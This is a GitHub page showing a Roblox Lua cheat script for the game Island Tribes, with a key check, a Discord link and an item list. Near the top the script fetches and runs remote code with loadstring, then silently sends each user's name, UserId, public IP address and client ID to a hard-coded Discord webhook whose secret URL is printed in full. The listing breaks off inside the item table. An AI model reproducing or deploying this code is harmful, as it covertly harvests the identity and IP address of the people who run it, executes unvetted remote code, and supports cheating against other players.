Skip to content
Navigation Menu
EliteChaoss
EliteChaoss

Type / to search
Code
Pull requests
Actions
Projects
Security
Insights
Settings
Creating a new file in EliteChaoss
BreadcrumbsEliteChaoss
/
Name your file...
in
main

Edit

Preview
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284
285
286
287
288
289
290
291
292
293
294
295
296
297
298
299
300
301
302
303
304
305
306
307
308
309
310
311
312
313
314
315
316
317
318
319
320
321
322
323
324
325
326
327
328
329
330
331
332
333
334
335
336
337
338
339
340
341
342
343
344
345
346
347
348
349
350
351
352
353
354
355
356
357
358
359
360
361
362
363
364
365
366
367
368
369
370
371
372
373
374
375
376
377
378
379
380
381
382
383
384
385
386
387
388
389
390
391
392
393
394
395
396
397
398
399
400
401
402
403
404
405
406
407
408
409
410
411
412
413
414
415
416
417
418
419
420
421
422
423
424
425
426
427
428
429
430
431
432
433
434
435
436
437
438
439
440
441
442
443
444
445
446
447
448
449
450
451
452
453
454
455
456
457
458
459
460
461
462
463
464
465
466
467
468
469
470
471
472
473
474
475
476
477
478
479
480
481
482
483
484
485
486
487
488
489
490
491
492
493
494
495
496
497
498
499
500
501
502
503
504
505
506
507
508
509
510
511
512
513
514
515
516
517
518
519
520
521
522
523
524
525
526
527
528
529
530
531
532
533
534
535
536
537
538
539
540
541
542
543
544
545
546
547
548
549
550
551
552
553
554
555
556
557
558
559
560
561
562
563
564
565
566
567
568
569
570
571
572
573
574
575
576
577
578
579
580
581
582
583
584
585
586
587
588
589
590
591
592
593
594
595
596
597
598
599
600
601
602
603
604
605
606
607
608
609
610
611
612
613
614
615
616
617
618
619
620
621
622
623
624
625
626
627
628
629
630
631
632
633
634
635
636
637
638
639
640
641
642
643
644
645
646
647
648
649
650
651
652
653
654
655
656
657
658
659
660
661
662
663
664
665
666
667
668
669
670
671
672
673
674
675
676
677
678
679
680
681
682
683
684
685
686
687
688
689
690
691
692
693
694
695
696
697
698
699
700
701
702
703
704
705
706
707
708
709
710
711
712
713
714
715
716
717
718
719
720
721
722
723
724
725
726
727
728
729
730
731
732
733
734
735
736
737
738
739
740
741
742
743
744
745
746
747
748
749
750
751
752
753
754
755
756
757
758
759
760
761
762
763
764
765
766
767
768
769
770
771
772
773
774
775
776
777
778
779
780
781
782
783
784
785
786
787
788
789
790
791
792
793
794
795
796
797
798
799
800
801
802
803
804
805
806
807
808
809
810
811
812
813
814
815
816
817
818
819
820
821
822
823
824
825
826
827
828
829
830
831
832
833
834
835
836
837
838
839
840
841
842
843
844
845
846
847
848
849
850
851
852
853
854
855
856
857
858
859
860
861
862
863
864
865
866
867
868
869
870
871
872
873
874
875
876
877
878
879
880
881
882
883
884
885
886
887
888
889
890
891
892
893
894
895
896
897
898
899
900
901
902
903
904
905
906
907
908
909
910
911
912
913
914
915
916
917
918
919
920
921
922
923
924
925
926
927
928
929
930
931
932
933
934
935
936
937
938
939
940
941
942
943
944
945
946
947
948
949
950
951
952
953
954
955
956
957
958
959
960
961
962
963
964
965
966
967
968
969
970
971
972
973
974
975
976
977
978
979
980
981
982
983
984
985
986
987
988
989
990
991
992
993
994
995
996
997
998
999
1000
1001
1002
1003
1004
1005
1006
1007
1008
1009
1010
1011
1012
1013
1014
1015
1016
1017
1018
1019
1020
1021
1022
1023
1024
1025
1026
1027
1028
1029
1030
1031
1032
1033
1034
1035
1036
1037
1038
1039
1040
1041
1042
1043
1044
1045
1046
1047
1048
1049
1050
1051
1052
1053
1054
1055
1056
1057
1058
1059
1060
1061
1062
1063
1064
1065
1066
1067
1068
1069
1070
1071
1072
1073
1074
1075
1076
1077
1078
1079
1080
1081
1082
1083
1084
1085
1086
1087
1088
1089
1090
1091
1092
1093
1094
1095
1096
1097
1098
1099
1100
1101
1102
1103
1104
1105
1106
1107
1108
1109
1110
1111
1112
1113
1114
1115
1116
1117
1118
1119
1120
1121
1122
1123
1124
1125
1126
1127
1128
1129
1130
1131
1132
1133
1134
1135
1136
1137
1138
1139
1140
1141
1142
1143
1144
1145
1146
1147
1148
1149
1150
1151
1152
1153
1154
1155
1156
1157
1158
1159
1160
1161
1162
1163
1164
1165
1166
1167
1168
1169
1170
1171
1172
1173
1174
1175
1176
1177
1178
1179
1180
1181
1182
1183
1184
1185
1186
1187
1188
1189
1190
1191
1192
1193
1194
1195
1196
1197
1198
1199
1200
1201
1202
1203
1204
1205
1206
1207
1208
1209
1210
1211
1212
1213
1214
1215
1216
1217
1218
1219
1220
1221
1222
1223
1224
1225
1226
1227
1228
1229
1230
1231
1232
1233
1234
1235
1236
1237
1238
1239
1240
1241
1242
1243
1244
1245
1246
1247
1248
1249
1250
1251
1252
1253
1254
1255
1256
1257
1258
1259
1260
1261
1262
1263
1264
1265
1266
1267
1268
1269
1270
1271
1272
1273
1274
1275
1276
1277
1278
1279
1280
1281
1282
1283
1284
1285
1286
1287
1288
1289
1290
1291
1292
1293
1294
1295
1296
1297
1298
1299
1300
1301
1302
1303
1304
1305
1306
1307
1308
1309
1310
1311
1312
1313
1314
1315
1316
1317
1318
1319
1320
1321
1322
1323
1324
1325
1326
1327
1328
1329
1330
1331
1332
1333
1334
1335
1336
1337
1338
1339
1340
1341
1342
1343
1344
1345
1346
1347
1348
1349
1350
1351
1352
1353
1354
1355
1356
1357
1358
1359
1360
1361
1362
1363
1364
1365
1366
1367
1368
1369
1370
1371
1372
1373
1374
1375
1376
1377
1378
1379
1380
1381
1382
1383
1384
1385
1386
1387
1388
1389
1390
1391
1392
1393
1394
1395
1396
1397
1398
1399
1400
1401
1402
1403
1404
1405
1406
1407
1408
1409
1410
1411
1412
1413
1414
1415
1416
1417
1418
1419
1420
1421
1422
1423
1424
1425
1426
1427
1428
1429
1430
1431
1432
1433
1434
1435
1436
1437
1438
1439
1440
1441
1442
1443
1444
1445
1446
1447
1448
1449
1450
1451
1452
1453
1454
1455
1456
1457
1458
1459
1460
1461
1462
1463
1464
1465
1466
1467
1468
1469
1470
1471
1472
1473
1474
1475
1476
1477
1478
1479
1480
1481
1482
1483
1484
1485
1486
1487
1488
1489
1490
1491
1492
1493
1494
1495
1496
1497
1498
1499
1500
1501
1502
1503
1504
1505
1506
1507
1508
1509
1510
1511
1512
1513
1514
1515
1516
1517
1518
1519
1520
1521
1522
1523
1524
1525
1526
1527
1528
1529
1530
1531
1532
1533
1534
1535
1536
1537
1538
1539
1540
1541
1542
1543
1544
1545
1546
1547
1548
1549
1550
1551
1552
1553
1554
1555
1556
1557
1558
1559
1560
1561
1562
1563
1564
1565
1566
1567
1568
1569
1570
1571
1572
1573
1574
1575
1576
1577
1578
1579
1580
1581
1582
1583
1584
1585
1586
1587
1588
1589
1590
1591
1592
1593
1594
1595
1596
1597
1598
1599
1600
1601
1602
1603
1604
1605
1606
1607
1608
1609
1610
1611
1612
1613
1614
1615
1616
1617
1618
1619
1620
1621
1622
1623
1624
1625
1626
1627
1628
1629
1630
1631
1632
1633
1634
1635
1636
1637
1638
1639
1640
1641
1642
1643
1644
1645
1646
1647
1648
1649
1650
1651
1652
1653
1654
1655
1656
1657
1658
1659
1660
1661
1662
1663
1664
1665
1666
1667
1668
1669
1670
1671
1672
1673
1674
1675
1676
1677
1678
1679
1680
1681
1682
1683
1684
1685
1686
1687
1688
1689
1690
1691
1692
1693
1694
1695
1696
1697
1698
1699
1700
1701
1702
1703
1704
1705
1706
1707
1708
1709
1710
1711
1712
1713
1714
1715
1716
1717
1718
1719
1720
1721
1722
1723
1724
1725
1726
1727
1728
1729
1730
1731
1732
1733
1734
1735
1736
1737
1738
1739
1740
1741
1742
1743
1744
1745
1746
1747
1748
1749
1750
1751
1752
1753
1754
1755
1756
1757
1758
1759
1760
1761
1762
1763
1764
1765
1766
1767
1768
1769
1770
1771
1772
1773
1774
1775
1776
1777
1778
1779
1780
1781
1782
1783
1784
1785
1786
1787
1788
1789
1790
1791
1792
1793
1794
1795
1796
1797
1798
1799
1800
1801
1802
1803
1804
1805
1806
1807
1808
1809
1810
1811
1812
1813
1814
1815
1816
1817
1818
1819
1820
1821
1822
1823
1824
1825
1826
1827
1828
1829
1830
1831
1832
1833
1834
1835
1836
1837
1838
1839
1840
1841
1842
1843
1844
1845
1846
1847
1848
1849
1850
1851
1852
1853
1854
1855
1856
1857
1858
1859
1860
1861
1862
1863
1864
1865
1866
1867
1868
1869
1870
1871
1872
1873
1874
1875
1876
1877
1878
1879
1880
1881
1882
1883
1884
1885
1886
1887
1888
1889
1890
1891
1892
1893
1894
1895
1896
1897
1898
1899
1900
1901
1902
1903
1904
1905
1906
1907
1908
1909
1910
1911
1912
1913
1914
1915
1916
1917
1918
1919
1920
1921
1922
1923
1924
1925
1926
1927
1928
1929
1930
1931
1932
1933
1934
1935
1936
1937
1938
1939
1940
1941
1942
1943
1944
1945
1946
1947
1948
1949
1950
1951
1952
1953
1954
1955
1956
1957
1958
1959
1960
1961
1962
1963
1964
1965
1966
1967
1968
1969
1970
1971
1972
1973
1974
1975
1976
1977
1978
1979
1980
1981
1982
1983
1984
1985
1986
1987
1988
1989
1990
1991
1992
1993
1994
1995
1996
1997
1998
1999
2000
2001
2002
2003
2004
2005
2006
2007
2008
2009
2010
2011
2012
2013
2014
2015
2016
2017
2018
2019
2020
2021
2022
2023
2024
2025
2026
2027
2028
2029
2030
2031
2032
2033
2034
2035
2036
2037
2038
2039
2040
2041
2042
2043
2044
2045
2046
2047
2048
2049
2050
2051
2052
2053
2054
2055
2056
2057
2058
2059
2060
2061
2062
2063
2064
2065
2066
2067
2068
2069
2070
2071
2072
2073
2074
2075
2076
2077
2078
2079
2080
2081
2082
2083
2084
2085
2086
2087
2088
2089
2090
2091
2092
2093
2094
2095
2096
2097
2098
2099
2100
2101
2102
2103
2104
2105
2106
2107
2108
2109
2110
2111
2112
2113
2114
2115
2116
2117
2118
2119
2120
2121
2122
2123
2124
2125
2126
2127
2128
2129
2130
2131
2132
2133
2134
2135
2136
2137
2138
2139
2140
2141
2142
2143
2144
2145
2146
2147
2148
2149
2150
2151
2152
2153
2154
2155
2156
2157
2158
2159
2160
2161
2162
2163
2164
2165
2166
2167
2168
2169
2170
2171
2172
2173
2174
2175
2176
2177
2178
2179
2180
2181
2182
2183
2184
2185
2186
2187
2188
2189
2190
2191
2192
2193
2194
2195
2196
2197
2198
2199
2200
2201
2202
2203
2204
2205
2206
2207
2208
2209
2210
2211
2212
2213
2214
2215
2216
2217
2218
2219
2220
2221
2222
2223
2224
2225
2226
2227
2228
2229
2230
2231
2232
2233
2234
2235
2236
2237
2238
2239
2240
2241
2242
2243
2244
2245
2246
2247
2248
2249
2250
2251
2252
2253
2254
2255
2256
2257
2258
2259
2260
2261
2262
2263
2264
2265
2266
2267
2268
2269
2270
2271
2272
2273
2274
2275
2276
2277
2278
2279
2280
2281
2282
2283
2284
2285
2286
2287
2288
2289
2290
2291
2292
2293
2294
2295
2296
2297
2298
2299
2300
2301
2302
2303
2304
2305
2306
2307
2308
2309
2310
2311
2312
2313
2314
2315
2316
2317
2318
2319
2320
2321
2322
2323
2324
2325
2326
2327
2328
2329
2330
2331
2332
2333
2334
2335
2336
2337
2338
2339
2340
2341
2342
2343
2344
2345
2346
2347
2348
2349
2350
2351
2352
2353
2354
2355
2356
2357
2358
2359
2360
2361
2362
2363
2364
2365
2366
2367
2368
2369
2370
2371
2372
2373
2374
2375
2376
2377
2378
2379
2380
2381
2382
2383
2384
2385
2386
2387
2388
2389
2390
2391
2392
2393
2394
2395
2396
2397
2398
2399
2400
2401
2402
2403
2404
2405
2406
2407
2408
2409
2410
2411
2412
2413
2414
2415
2416
2417
2418
2419
2420
2421
2422
2423
2424
2425
2426
2427
2428
2429
2430
2431
2432
2433
2434
2435
2436
2437
2438
2439
2440
2441
2442
2443
2444
2445
2446
2447
2448
2449
2450
2451
2452
2453
2454
2455
2456
2457
2458
2459
2460
2461
2462
2463
2464
2465
2466
2467
2468
2469
2470
2471
2472
2473
2474
2475
2476
2477
2478
2479
2480
2481
2482
2483
2484
2485
2486
2487
2488
2489
2490
2491
2492
2493
2494
2495
2496
2497
2498
2499
2500
2501
2502
2503
2504
2505
2506
2507
2508
2509
2510
2511
2512
2513
2514
2515
2516
2517
2518
2519
2520
2521
2522
2523
2524
2525
2526
2527
2528
2529
2530
2531
2532
2533
2534
2535
2536
2537
2538
2539
2540
2541
2542
2543
2544
2545
2546
2547
2548
2549
2550
2551
2552
2553
2554
2555
2556
2557
2558
2559
2560
2561
2562
2563
2564
2565
2566
2567
2568
2569
2570
2571
2572
2573
2574
2575
2576
2577
2578
2579
2580
2581
2582
2583
2584
2585
2586
2587
2588
2589
2590
2591
2592
2593
2594
2595
2596
2597
2598
2599
2600
2601
2602
2603
2604
2605
2606
2607
2608
2609
2610
2611
2612
2613
2614
2615
2616
2617
2618
2619
2620
2621
2622
2623
2624
2625
2626
2627
2628
2629
2630
2631
2632
2633
2634
2635
2636
2637
2638
2639
2640
2641
2642
2643
2644
2645
2646
2647
2648
2649
2650
2651
2652
2653
2654
2655
2656
2657
2658
2659
2660
2661
2662
2663
2664
2665
2666
2667
2668
2669
2670
2671
2672
2673
2674
2675
2676
2677
2678
2679
2680
2681
2682
2683
2684
2685
2686
2687
2688
2689
2690
2691
2692
2693
2694
2695
2696
2697
2698
2699
2700
2701
2702
2703
2704
2705
2706
2707
2708
2709
2710
2711
2712
2713
2714
2715
2716
2717
2718
2719
2720
2721
2722
2723
2724
2725
2726
2727
2728
2729
2730
2731
2732
2733
2734
2735
2736
2737
2738
2739
2740
2741
2742
2743
2744
2745
2746
2747
2748
2749
2750
2751
2752
2753
2754
2755
2756
2757
2758
2759
2760
2761
2762
2763
2764
2765
2766
2767
2768
2769
2770
2771
2772
2773
2774
2775
2776
2777
2778
2779
2780
2781
2782
2783
2784
2785
2786
2787
2788
2789
2790
2791
2792
2793
2794
2795
2796
2797
2798
2799
2800
2801
2802
2803
2804
2805
2806
2807
2808
2809
2810
2811
2812
2813
2814
2815
2816
2817
2818
2819
2820
2821
2822
2823
2824
2825
2826
2827
2828
2829
2830
2831
2832
2833
2834
2835
2836
2837
2838
2839
2840
2841
2842
2843
2844
2845
2846
2847
2848
2849
2850
2851
2852
2853
2854
2855
2856
2857
2858
2859
2860
2861
2862
2863
2864
2865
2866
2867
2868
2869
2870
2871
2872
2873
2874
2875
2876
2877
2878
2879
2880
2881
2882
2883
2884
2885
2886
2887
2888
2889
2890
2891
2892
2893
2894
2895
2896
2897
2898
2899
2900
2901
2902
2903
2904
2905
2906
2907
2908
2909
2910
2911
2912
2913
2914
2915
2916
2917
2918
2919
2920
2921
2922
2923
2924
2925
2926
2927
2928
2929
2930
2931
2932
2933
2934
2935
2936
2937
2938
2939
2940
2941
2942
2943
2944
2945
2946
2947
2948
2949
2950
2951
2952
2953
2954
2955
2956
2957
2958
2959
2960
2961
2962
2963
2964
2965
2966
2967
2968
2969
2970
2971
2972
2973
2974
2975
2976
2977
2978
2979
2980
2981
2982
2983
2984
2985
2986
2987
2988
2989
2990
2991
2992
2993
2994
2995
2996
2997
2998
2999
3000
3001
3002
3003
3004
3005
3006
3007
3008
3009
3010
3011
3012
3013
3014
3015
3016
3017
3018
3019
3020
3021
3022
3023
3024
3025
3026
3027
3028
3029
3030
3031
3032
3033
3034
3035
3036
3037
3038
3039
3040
3041
3042
3043
3044
3045
3046
3047
3048
3049
3050
3051
3052
3053
3054
3055
3056
3057
3058
3059
3060
3061
3062
3063
3064
3065
3066
3067
3068
3069
3070
3071
3072
3073
3074
3075
3076
3077
3078
3079
3080
3081
3082
3083
3084
3085
3086
3087
3088
3089
3090
3091
3092
3093
3094
3095
3096
3097
3098
3099
3100
3101
3102
3103
3104
3105
3106
3107
3108
3109
3110
3111
3112
3113
3114
3115
3116
3117
3118
3119
3120
3121
3122
3123
3124
3125
3126
3127
3128
3129
3130
3131
3132
3133
3134
3135
3136
3137
3138
3139
3140
3141
3142
3143
3144
3145
3146
3147
3148
3149
3150
3151
3152
3153
3154
3155
3156
3157
3158
3159
3160
3161
3162
3163
3164
3165
3166
3167
3168
3169
3170
3171
3172
3173
3174
3175
3176
3177
3178
3179
3180
3181
3182
3183
3184
3185
3186
3187
3188
3189
3190
3191
3192
3193
3194
3195
3196
3197
3198
3199
3200
3201
3202
3203
3204
3205
3206
3207
3208
3209
3210
3211
3212
3213
3214
3215
3216
3217
3218
3219
3220
3221
3222
3223
3224
3225
3226
3227
3228
3229
3230
3231
3232
3233
3234
3235
3236
3237
3238
3239
3240
3241
3242
3243
3244
3245
3246
3247
3248
3249
3250
3251
3252
3253
3254
3255
3256
3257
3258
3259
3260
3261
3262
3263
3264
3265
3266
3267
3268
3269
3270
3271
3272
3273
3274
3275
3276
3277
3278
3279
3280
3281
3282
3283
3284
3285
3286
3287
3288
3289
3290
3291
3292
3293
3294
3295
3296
3297
3298
3299
3300
3301
3302
3303
3304
3305
3306
3307
3308
3309
3310
3311
3312
3313
3314
3315
3316
3317
3318
3319
3320
3321
3322
3323
3324
3325
3326
3327
3328
3329
3330
3331
3332
3333
3334
3335
3336
3337
3338
3339
3340
3341
3342
3343
3344
3345
3346
3347
3348
3349
3350
3351
3352
3353
3354
3355
3356
3357
3358
3359
3360
3361
3362
3363
3364
3365
3366
3367
3368
3369
3370
3371
3372
3373
3374
3375
3376
3377
3378
3379
3380
3381
3382
3383
3384
3385
3386
3387
3388
3389
3390
3391
3392
3393
3394
3395
3396
3397
3398
3399
3400
3401
3402
3403
3404
3405
3406
3407
3408
3409
3410
3411
3412
3413
3414
3415
3416
3417
3418
3419
3420
3421
3422
3423
3424
3425
3426
3427
3428
3429
3430
3431
3432
3433
3434
3435
3436
3437
3438
3439
3440
3441
3442
3443
3444
3445
3446
3447
3448
3449
3450
3451
3452
3453
3454
3455
3456
3457
3458
3459
3460
3461
3462
3463
3464
3465
3466
3467
3468
3469
3470
3471
3472
3473
3474
3475
3476
3477
3478
3479
3480
3481
3482
3483
3484
3485
3486
3487
3488
3489
3490
3491
3492
3493
3494
3495
3496
3497
3498
3499
3500
3501
3502
3503
3504
3505
3506
3507
3508
3509
3510
3511
3512
3513
3514
3515
3516
3517
3518
3519
3520
3521
3522
3523
3524
3525
3526
3527
3528
3529
3530
3531
3532
3533
3534
3535
3536
3537
3538
3539
3540
3541
3542
3543
3544
3545
3546
3547
3548
3549
3550
3551
3552
3553
3554
3555
3556
3557
3558
3559
3560
3561
3562
3563
3564
3565
3566
3567
3568
3569
3570
3571
3572
3573
3574
3575
3576
3577
3578
3579
3580
3581
3582
3583
3584
3585
3586
3587
3588
3589
3590
3591
3592
3593
3594
3595
3596
3597
3598
3599
3600
3601
3602
3603
3604
3605
3606
3607
3608
3609
3610
3611
3612
3613
3614
3615
3616
3617
3618
3619
3620
3621
3622
3623
3624
3625
3626
3627
3628
3629
3630
3631
3632
3633
3634
3635
3636
3637
3638
3639
3640
3641
3642
3643
3644
3645
3646
3647
3648
3649
3650
3651
3652
3653
3654
3655
3656
3657
3658
3659
3660
3661
3662
3663
3664
3665
3666
3667
3668
3669
3670
3671
3672
3673
3674
3675
3676
3677
3678
3679
3680
3681
3682
3683
3684
3685
3686
3687
3688
3689
3690
3691
3692
3693
3694
3695
3696
3697
3698
3699
3700
3701
3702
3703
3704
3705
3706
3707
3708
3709
3710
3711
3712
3713
3714
3715
3716
3717
3718
3719
3720
3721
3722
3723
3724
3725
3726
3727
3728
3729
3730
3731
3732
3733
3734
3735
3736
3737
3738
3739
3740
3741
3742
3743
3744
3745
3746
3747
3748
3749
3750
3751
3752
3753
3754
3755
3756
3757
3758
3759
3760
3761
3762
3763
3764
3765
3766
3767
3768
3769
3770
3771
3772
3773
3774
3775
3776
3777
3778
3779
3780
3781
3782
3783
3784
3785
3786
3787
3788
3789
3790
3791
3792
3793
3794
3795
3796
3797
3798
3799
3800
3801
3802
3803
3804
3805
3806
3807
3808
3809
3810
3811
3812
3813
3814
3815
3816
3817
3818
3819
3820
3821
3822
3823
3824
3825
3826
3827
3828
3829
3830
3831
3832
3833
3834
3835
3836
3837
3838
3839
3840
3841
3842
3843
3844
3845
3846
3847
3848
3849
3850
3851
3852
3853
3854
3855
3856
3857
3858
3859
3860
3861
3862
3863
3864
3865
3866
3867
3868
3869
3870
3871
3872
3873
3874
3875
3876
3877
3878
3879
3880
3881
3882
3883
3884
3885
3886
3887
3888
3889
3890
3891
3892
3893
3894
3895
3896
3897
3898
3899
3900
3901
3902
3903
3904
3905
3906
3907
3908
3909
3910
3911
3912
3913
3914
3915
3916
3917
3918
3919
3920
3921
3922
3923
3924
3925
3926
3927
3928
3929
3930
3931
3932
3933
3934
3935
3936
3937
3938
3939
3940
3941
3942
3943
3944
3945
3946
3947
3948
3949
3950
3951
3952
3953
3954
3955
3956
3957
3958
3959
3960
3961
3962
3963
3964
3965
3966
3967
3968
3969
3970
3971
3972
3973
3974
3975
3976
3977
3978
3979
3980
3981
3982
3983
3984
3985
3986
3987
3988
3989
3990
3991
3992
3993
3994
3995
3996
3997
3998
3999
4000
4001
4002
4003
4004
4005
4006
4007
4008
4009
4010
4011
4012
4013
4014
4015
4016
4017
4018
4019
4020
4021
4022
4023
4024
4025
4026
4027
4028
4029
4030
4031
4032
4033
4034
4035
4036
4037
4038
4039
4040
4041
4042
4043
4044
4045
4046
4047
4048
4049
4050
4051
4052
4053
4054
4055
4056
4057
4058
4059
4060
4061
4062
4063
4064
4065
4066
4067
4068
4069
4070
4071
4072
4073
4074
4075
4076
4077
4078
4079
4080
4081
4082
4083
4084
4085
4086
4087
4088
4089
4090
4091
4092
4093
4094
4095
4096
4097
4098
4099
4100
4101
4102
4103
4104
4105
4106
4107
4108
4109
4110
4111
4112
4113
4114
4115
4116
4117
4118
4119
4120
4121
4122
4123
4124
4125
4126
4127
4128
4129
4130
4131
4132
4133
loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/OBEDSKDKSKFJSJF/main/AntiHTTPSpy.lua"))()
local loading = false
repeat task.wait()
	if not loading then
		loading = true
		print('Loading Tribes Killer')
	end
until not game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading') or game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading').Parent == nil

local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/hiptodude2/the-opness-of-island-tribes/main/AtlasNewVers.lua"))()
local AtlasUi = Atlas.new({
    Name = "🌴 Island Tribes Eliter 🌴";
    ConfigFolder = "IslandTribes"; 
    Credit = "Credits: Elitechaosss and help of Casey";
    Color = Color3.fromRGB(113, 35, 186);
    UseLoader = false;
    Bind = "LeftBracket";
    FullName = "Island Tribes";
    CheckKey = function(lbozo)
        return lbozo == "Eliter787-187"
    end;
    Discord = "https://discord.gg/radd9wnwNp";
})

HttpService = game:GetService("HttpService")
Webhook_URL =  "https://discord.com/api/webhooks/1305585967339671552/cjHtSNM4GTgEwiVwMn8ERSYELVnlfd95Fczisz3RgH2hzNnafnhzqoJ7MZ-Tqxq3L25G"
 
local request = syn and syn.request or request or http and http.request or http_request
 
local response = request({
    Url = Webhook_URL,
    Method = "POST",
    Headers = {
        ['Content-Type'] = 'application/json'
    },
    Body = HttpService:JSONEncode({
        ["content"] = "",
        ["embeds"] = {
            {
                ["title"] = "",
                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["fields"] = {
                    {
                        ["name"] = "Player Name : ",
                        ["value"] = game.Players.LocalPlayer.Name,
                        ["inline"] = true
                    }, {
                        ["name"] = "UserId : ",
                        ["value"] = game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "User Profile : ",
                        ["value"] = "https://www.roblox.com/users/" ..
                            game.Players.LocalPlayer.UserId,
                        ["inline"] = true
                    }, {
                        ["name"] = "IP: ",
                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
                        ["inline"] = true
                    }, {
                        ["name"] = "Client Id : ",
                        ["value"] = game:GetService("RbxAnalyticsService")
                            :GetClientId(),
                        ["inline"] = true
                    }, {
                        ["name"] = "Key : ",
                        ["value"] = "1001240139",
                        ["inline"] = true
                    }
                }
            }
        }
    })
})
--Services
Workspace = game:GetService('Workspace')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
UserInputService = game:GetService('UserInputService')
TweenService = game:GetService("TweenService")
RunService = game:GetService('RunService')
Lighting  = game:GetService('Lighting')
VirtualUser = game:GetService("VirtualUser")
HttpService = game:GetService('HttpService')
TeleportService = game:GetService("TeleportService")
PlayersFolder = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive')
function GetCharacter(playerName)
    local playerFolder = PlayersFolder:FindFirstChild(playerName)
    
    if playerFolder then
        return playerFolder:FindFirstChild("Character")
    else
        return nil
    end
end
--Globals
LocalPlayer = Players.LocalPlayer
Mouse = LocalPlayer:GetMouse()
Camera = Workspace.CurrentCamera
ALLITEMS = {
    [1] = "Stick",
    [2] = "Small Raft",
    [3] = "Small Campfire",
    [4] = "Wood Boots",
    [5] = "Wooden Harvester",
    [6] = "Wood Helmet",
    [7] = "Wooden Club",
    [8] = "Leather Bag",
    [9] = "Wood Body",
    [10] = "Wood Legs",
    [11] = "Wood Storage Chest",
    [12] = "Wood Bridge",
    [13] = "Wood Wall",
    [14] = "Teepee",
    [15] = "Plant Box",
    [16] = "Hardleather Bag",
    [17] = "Stone Boots",
    [18] = "Stone Harvester",
    [19] = "Wooden Sword",
    [20] = "Large Campfire",
    [21] = "Stone Helmet",
    [22] = "Party Raft",
    [23] = "Wood Gate",
    [24] = "Reinforced Bag",
    [25] = "Stone Body",
    [26] = "Stone Legs",
    [27] = "Stone Storage Chest",
    [28] = "Furnace",
    [29] = "Silver Boots",
    [30] = "Wooden Bow",
    [31] = "Arrow",
    [32] = "Stone Wall",
    [33] = "Silver Helmet",
    [34] = "Stone Sword",
    [35] = "Fishing Rod",
    [36] = "Stone Gate",
    [37] = "Silver Bag",
    [38] = "Silver Harvester",
    [39] = "Silver Body",
    [40] = "Silver Legs",
    [41] = "Silver Storage Chest",
    [42] = "Ladder",
    [43] = "Gold Boots",
    [44] = "Silver Sword",
    [45] = "Stone Land Bridge",
    [46] = "Silver Wall",
    [47] = "Gold Helmet",
    [48] = "Bed",
    [49] = "Stone Bridge",
    [50] = "Silver Gate",
    [51] = "Golden Harvester",
    [52] = "Gold Body",
    [53] = "Gold Legs",
    [54] = "Gold Storage Chest",
    [55] = "Golden Bag",
    [56] = "Ruby Boots",
    [57] = "Golden Sword",
    [58] = "Gold Wall",
    [59] = "Ruby Helmet",
    [60] = "Tent Raft",
    [61] = "Golden Bow",
    [62] = "Gold Gate",
    [63] = "Ruby Harvester",
    [64] = "Ruby Body",
    [65] = "Ruby Legs",
    [66] = "Ruby Storage Chest",
    [67] = "Diamond Boots",
    [68] = "Ruby Sword",
    [69] = "Ruby Bag",
    [70] = "Diamond Harvester",
    [71] = "Diamond Helmet",
    [72] = "Ruby Wall",
    [73] = "Diamond Body",
    [74] = "Diamond Legs",
    [75] = "Ruby Gate",
    [76] = "Diamond Storage Chest",
    [77] = "Ruby Bow",
    [78] = "Diamond Wall",
    [79] = "Diamond Gate",
    [80] = "Diamond Bag",
    [81] = "Small Log",
    [82] = "Big Log",
    [83] = "Small Rock",
    [84] = "Large Rock",
    [85] = "Raw Fish",
    [86] = "Cooked Fish",
    [87] = "Raw Meat",
    [88] = "Cooked Meat",
    [89] = "Silver Ore",
    [90] = "Silver Bar",
    [91] = "Gold Ore",
    [92] = "Gold Bar",
    [93] = "Unrefined Ruby",
    [94] = "Ruby",
    [95] = "Unrefined Diamond",
    [96] = "Diamond",
    [97] = "Redberry",
    [98] = "Coconut",
    [99] = "Watermelon",
    [100] = "Watermelon Seeds",
    [101] = "Carrot",
    [102] = "Carrot Seeds",
    [103] = "Raw Potato",
    [104] = "Potato Seeds",
    [105] = "Banana",
    [106] = "Leaves",
    [107] = "Leather",
    [108] = "Feather",
    [109] = "Feather Stack",
    [110] = "Arrow Stack",
    [111] = "Freshy Chest",
    [112] = "Stone Supplies",
    [113] = "Wooden Warrior Pack",
    [114] = "Feather Pack",
    [115] = "Arrow Pack",
    [116] = "Silver Warrior Pack",
    [117] = "Fisherman's Pack",
    [118] = "Golden Archer Pack",
    [119] = "Ruby Hero Pack",
    [120] = "Infinite Campfire",
    [121] = "Bowling Pins",
    [122] = "Cabbage",
    [123] = "Cabbage Seeds",
    [124] = "Torch",
    [125] = "Tiki Torch",
    [126] = "Baked Potato",
    [127] = "Small Wood Base",
    [128] = "Medium Wood Base",
    [129] = "Large Wood Base",
    [130] = "Small Stone Base",
